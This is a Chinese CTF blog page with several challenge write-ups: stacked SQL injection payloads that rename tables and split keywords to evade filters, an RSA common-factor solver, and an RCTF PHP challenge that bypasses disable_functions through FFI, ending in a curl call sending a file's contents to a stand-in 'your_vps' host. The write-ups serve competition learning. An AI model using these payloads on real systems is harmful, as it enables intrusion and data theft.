class="line">command=<span class="string">"echo 'lihuaiqiu'"</span></span><br><span class="line">filename=os.listdir(<span class="string">"F:\\phpstudy\\WWW\\src"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> filename:</span><br><span class="line">    true_url=url+i</span><br><span class="line">    d=open(<span class="string">"F:\\phpstudy\\WWW\\src\\"</span>+i)</span><br><span class="line">    c=d.read()</span><br><span class="line">    params=partern.findall(c)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> params:</span><br><span class="line">        url2=true_url+<span class="string">'?'</span>+j[<span class="number">1</span>]+<span class="string">'='</span>+command</span><br><span class="line">        r=requests.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"lihuaiqiu"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Webshell"</span></span><br><span class="line">            <span class="keyword">print</span> url2</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>这道题成功触及了我的知识盲区….来学习一波</p>
<h4 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h4><p>先基本操作一下，看看表，数据库，当前表</p>
<p><code>1&#39;;show databases;</code></p>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>1&#39;;show tables;</code></p>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>1&#39;;describe words;</code></p>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下过程省略…最后可以得到结果，我们处于<code>table words</code>中，而flag在<code>table 1919810931114514</code>中</p>
<p>也就是说我们需要在没有select的情况下进行跨表查询，下面就是学到师傅的姿势——<code>将flag表名改为当前表名words，再利用&#39;or &#39;1&#39;=&#39;1去获取flag表中所有内容。</code>但是这里需要注意的是words表比flag表多了一个id字段，所以我们要通过alert在flag表中添加一个id字段，最终payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;alert table &#39;1919810931114514&#39; add(id int NULL);rename table &#96;words&#96; to &#96;tmptable&#96;;rename table &#96;1919810931114514&#96;to words;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(38) &quot;flag&#123;3fy145hzdo5ryeho9za94r0qnbkvha0g&#125;&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h4><p>堆叠注入(预处理)</p>
<p>查询字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;;use information_schema;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect column_name from columns wher&#39;,&#39;e table_name&#x3D;&quot;1919810931114514&quot;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>

<p>爆字段内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;;use supersqli;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>

<p>大写PREPARE关键字绕过strstr，得到flag。</p>
<h3 id="强网先锋-上单"><a href="#强网先锋-上单" class="headerlink" title="强网先锋-上单"></a>强网先锋-上单</h3><p>挺沙雕的一道题….tp5框架的RCE，打就行了</p>
<h3 id="强网先锋-辅助"><a href="#强网先锋-辅助" class="headerlink" title="强网先锋-辅助"></a>强网先锋-辅助</h3><p>老套路了….公因数求q，然后得p,rsa一把梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n1=</span><br><span class="line">n2=</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">q=gcd(n1,n2)</span><br><span class="line">p1=n1/q</span><br><span class="line">fn1=(q<span class="number">-1</span>)*(p1<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,fn1)</span><br><span class="line">m=pow(c,d,n1)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure>

<h3 id="强网先锋-打野"><a href="#强网先锋-打野" class="headerlink" title="强网先锋-打野"></a>强网先锋-打野</h3><p>zsteg真香(学到了)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3oyb990kxj30qm0di0y2.jpg" alt=""></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/04/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/" data-id="ckabsu399003vkkvr9iqq0frn" class="article-share-link" data-share="baidu" data-title="强网杯部分wp">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/04/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-RCTF-nextphp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/03/RCTF-nextphp/" class="article-date">
  <time datetime="2019-06-03T12:49:00.000Z" itemprop="datePublished">2019-06-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/03/RCTF-nextphp/">RCTF-nextphp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>终于抽出时间来复现了一下这道题，下面是复现流程</p>
<h3 id="next-php"><a href="#next-php" class="headerlink" title="next-php"></a>next-php</h3><p>题目代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看看都有什么文件并且进行读取一下</p>
<p>列出文件</p>
<p><code>a=var_dump(glob(&#39;*.*&#39;));</code></p>
<p>回显结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">9</span>) <span class="string">"index.php"</span> [<span class="number">1</span>]=&gt; string(<span class="number">11</span>) <span class="string">"preload.php"</span> &#125;</span><br></pre></td></tr></table></figure>

<p>读取一下可疑文件<code>preload.php</code>，<code>a=show_source(&#39;preload.php&#39;);</code></p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">​        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">​        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">​        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 查看一下phpinfo</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3o77uxjwpj314v0773za.jpg" alt=""></p>
<p>可以看到通过<code>disable_functions</code>禁用了很多函数，并且进行了<code>open_basedir</code>限制</p>
<h4 id="攻击思考"><a href="#攻击思考" class="headerlink" title="攻击思考"></a>攻击思考</h4><p>可疑点存在于<code>preload.php</code>，查看一下官方手册有关于preload.php的信息</p>
<ul>
<li><a href="https://wiki.php.net/rfc/custom_object_serialization" target="_blank" rel="noopener">https://wiki.php.net/rfc/custom_object_serialization</a></li>
<li><a href="https://wiki.php.net/rfc/ffi#fficdef_string_cdef_string_lib_nullffi" target="_blank" rel="noopener">https://wiki.php.net/rfc/ffi#fficdef_string_cdef_string_lib_nullffi</a></li>
</ul>
<p>FFI调用函数方法如下</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3o80yhi6nj310g0cwgmv.jpg" alt=""></p>
<h5 id="所以我们可以通过FFI调用系统函数来bypass-disable-functions，并且当FFI-cdef不传第二个参数时，可以调用php源码中的函数。"><a href="#所以我们可以通过FFI调用系统函数来bypass-disable-functions，并且当FFI-cdef不传第二个参数时，可以调用php源码中的函数。" class="headerlink" title="所以我们可以通过FFI调用系统函数来bypass disable_functions，并且当FFI:cdef不传第二个参数时，可以调用php源码中的函数。"></a>所以我们可以通过<code>FFI</code>调用系统函数来<code>bypass disable_functions</code>，并且当FFI:cdef不传第二个参数时，可以调用php源码中的函数。</h5><p>而且这是一个自定义的序列化类，我们可以很明显的看出，在反序列化的时候会调用<code>unserialize</code>函数，在序列化的时候会调用<code>serialize</code>函数，这就是与普通序列化的不同之处。写下如下poc:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $data = [</span><br><span class="line"><span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line"><span class="string">'func'</span> =&gt; <span class="string">"FFI::cdef"</span>,</span><br><span class="line"><span class="string">'arg'</span> =&gt; <span class="string">"int system(const char *command);"</span> ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先在反序列化的过程中调用unserialize函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ppublic <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>将数组中<code>ret</code>赋值。</p>
<p>再通过__serialize函数去调用<code>ret</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>最终payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;unserialize(&#39;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#39;)-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&#39;curl your_vps&#x2F;&#96;cat flag&#96;&#39;);</span><br></pre></td></tr></table></figure>

<p>其实这里还可以通过__get方法去调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;unserialize(&#39;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#39;)-&gt;ret-&gt;system(&#39;curl your_vps&#x2F;&#96;cat flag&#96;&#39;);</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/03/RCTF-nextphp/" data-id="ckabsu38e001mkkvr9d75a92q" class="article-share-link" data-share="baidu" data-title="RCTF-nextphp">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/03/RCTF-nextphp/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-2019-安恒5月赛部分wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/02/2019-%E5%AE%89%E6%81%925%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86wp/" class="article-date">
  <time datetime="2019-06-01T23:36:07.000Z" itemprop="datePublished">2019-06-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/02/2019-%E5%AE%89%E6%81%925%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86wp/">2019 安恒5月赛部分wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周四那天有点事，并没有打上月赛，赛后向几位师傅要了一下题，做了一下</p>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><p>一道代码审计题，分为六个文件<code>common.php,edit_info.php,config.php,index.php,info.php,register.php</code></p>
<p>每个文件的逻辑大概如下</p>
<p><strong>common.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!is_array($value))&#123;</span><br><span class="line">                $arr[$key] = addslashes($value);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $arr[$key] = waf($arr[$key]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_POST = waf($_POST);</span><br><span class="line">    $_GET = waf($_GET);</span><br><span class="line"></span><br><span class="line">    $role = <span class="number">1</span>;</span><br><span class="line">    $table = <span class="string">"users"</span>;</span><br><span class="line"></span><br><span class="line">    extract($_POST,EXTR_SKIP);</span><br><span class="line">    extract($_GET,EXTR_SKIP);</span><br></pre></td></tr></table></figure>

<p>利用<code>waf</code>函数，将<code>POST与GET</code>的数组变量进行<code>addslashes</code>函数过滤单引号，双引号，反斜杠，而且这里的extract函数多了一个<code>EXTR_SKIP</code>参数，则表示此文件中传入的POST与GET变量不可覆盖，并且给<strong>$role赋值了1</strong>(这里后面会用到).</p>
<p><strong>config.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sql</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $servername = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">private</span> $passwd = <span class="string">"**********"</span>;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;conn = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;servername, <span class="keyword">$this</span>-&gt;name, <span class="keyword">$this</span>-&gt;passwd);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;conn-&gt;connect_error)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"conn error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_select_db(<span class="keyword">$this</span>-&gt;conn,<span class="string">'12_29_web'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getone</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class="line">        $row = mysqli_fetch_array($result);</span><br><span class="line">        <span class="keyword">return</span> $row;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($sql)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此文件用于与数据库建立，可以序列化的重要性，又提供了数据库两个查询接口函数</p>
<p><strong>register.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($tem))&#123;</span><br><span class="line">        <span class="keyword">require</span>(<span class="string">"template/$tem.php"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(<span class="string">"template/index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;$_POST[<span class="string">'password'</span>])&#123;</span><br><span class="line">        $sql_ = <span class="string">"select * from users where username='$username'"</span>;</span><br><span class="line">        $db = <span class="keyword">new</span> sql();</span><br><span class="line">        $row = $db-&gt;getone($sql_);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($row))&#123;</span><br><span class="line">            $sql_ = <span class="string">"insert into users (username,password,role) values('$username','$password',$role)"</span>;</span><br><span class="line">            $db-&gt;register($sql_);</span><br><span class="line">            header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

